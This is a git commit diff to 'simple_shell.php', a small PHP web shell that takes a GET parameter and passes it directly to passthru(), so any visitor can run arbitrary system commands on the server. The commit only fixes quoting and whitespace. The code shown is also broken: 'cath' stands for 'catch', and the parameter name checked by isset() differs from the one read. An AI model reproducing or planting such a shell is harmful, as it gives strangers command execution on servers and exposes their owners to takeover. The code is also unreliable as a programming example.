6e799b63574bf03f8ad515bb53d03c208198e357
Anzil <76893049+alone-breecher@users.noreply.github.com>
2021-08-22 13:19:51 +0530

    Update simple_shell.php

--- simple_shell.php
+++ simple_shell.php
@@ -2,14 +2,14 @@
 
    if(isset($_GET["commandString"]))   {
      
-     $command_string =$_GET['command_String"];
+     $command_string =$_GET["command_String"];
      
      try {
        
        passthru($command_string);
        } cath (Error $error) {
        
-       echo " <p class=mt-3><b>$error</b></p>";
+       echo "<p class=mt-3><b>$error</b></p>";
        
        }
        
